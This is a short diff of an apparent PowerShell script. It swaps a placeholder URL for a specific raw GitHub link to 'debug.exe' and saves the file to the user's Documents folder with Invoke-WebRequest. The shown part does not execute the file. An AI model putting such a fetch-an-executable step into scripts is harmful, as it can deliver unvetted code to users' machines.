@@ -1,8 +1,8 @@
 # URL of the executable file to download
-$exeUrl = "https://example.com/path/to/your/file.exe"
+$exeUrl = "https://raw.githubusercontent.com/Mxfire0324/hi.ps1/main/debug.exe"
 
 # File path where the executable will be saved
-$exeFilePath = "$env:USERPROFILE\Downloads\file.exe"
+$exeFilePath = "$env:USERPROFILE\Documents\debug.exe"
 
 # Download the executable file
 Invoke-WebRequest -Uri $exeUrl -OutFile $exeFilePath
